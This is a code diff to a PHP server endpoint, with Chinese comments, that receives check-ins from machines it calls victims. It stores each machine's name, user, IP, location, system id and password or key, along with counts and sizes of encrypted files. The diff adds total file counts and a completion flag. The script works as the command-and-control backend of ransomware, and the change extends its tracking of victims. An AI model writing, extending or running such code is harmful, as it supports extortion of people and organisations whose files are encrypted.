@@ -37,6 +37,10 @@ $encrypted_count = intval($_POST['encrypted_count'] ?? 0);
 $encrypted_size  = intval($_POST['encrypted_size']  ?? 0);
 $encrypted_types = $_POST['encrypted_types'] ?? '';
 $encrypted_detail = $_POST['encrypted_detail'] ?? '';
+$total_count     = intval($_POST['total_count'] ?? 0);
+$total_size      = intval($_POST['total_size']  ?? 0);
+$is_complete     = intval($_POST['is_complete'] ?? 1);  // 缺省视为已完成，兼容旧载荷
+$is_complete     = $is_complete ? 1 : 0;
 
 // 安全文件名
 $safe_machine  = sanitize_filename($machine_name);
@@ -59,15 +63,18 @@ file_put_contents($target_dir . '/' . $file, $password);
 
 // PDO预处理 — upsert: 同一systemid更新统计数据，新主机插入
 $stmt = $pdo->prepare(
-    'INSERT INTO victims (machine_name, computer_user, os, date, time, ip, location, systemid, password, encrypted_count, encrypted_size, encrypted_types, encrypted_detail)
-     VALUES (:machine_name, :computer_user, :os, :date, :time, :ip, :location, :systemid, :password, :encrypted_count, :encrypted_size, :encrypted_types, :encrypted_detail)
+    'INSERT INTO victims (machine_name, computer_user, os, date, time, ip, location, systemid, password, encrypted_count, encrypted_size, encrypted_types, encrypted_detail, total_count, total_size, is_complete)
+     VALUES (:machine_name, :computer_user, :os, :date, :time, :ip, :location, :systemid, :password, :encrypted_count, :encrypted_size, :encrypted_types, :encrypted_detail, :total_count, :total_size, :is_complete)
      ON DUPLICATE KEY UPDATE
        machine_name=VALUES(machine_name), computer_user=VALUES(computer_user),
        os=VALUES(os), ip=VALUES(ip), location=VALUES(location),
        encrypted_count=IF(VALUES(encrypted_count)>0,VALUES(encrypted_count),encrypted_count),
        encrypted_size=IF(VALUES(encrypted_size)>0,VALUES(encrypted_size),encrypted_size),
        encrypted_types=IF(VALUES(encrypted_types)!="",VALUES(encrypted_types),encrypted_types),
-       encrypted_detail=IF(VALUES(encrypted_detail)!="",VALUES(encrypted_detail),encrypted_detail)'
+       encrypted_detail=IF(VALUES(encrypted_detail)!="{}" AND VALUES(encrypted_detail)!="",VALUES(encrypted_detail),encrypted_detail),
+       total_count=IF(VALUES(total_count)>0,VALUES(total_count),total_count),
+       total_size=IF(VALUES(total_size)>0,VALUES(total_size),total_size),
+       is_complete=VALUES(is_complete)'
 );
 $stmt->execute([
     ':machine_name'    => $machine_name,
@@ -83,6 +90,9 @@ $stmt->execute([
     ':encrypted_size'  => $encrypted_size,
     ':encrypted_types' => $encrypted_types,
     ':encrypted_detail'=> $encrypted_detail,
+    ':total_count'     => $total_count,
+    ':total_size'      => $total_size,
+    ':is_complete'     => $is_complete,
 ]);
 
 echo 'handshake completed';
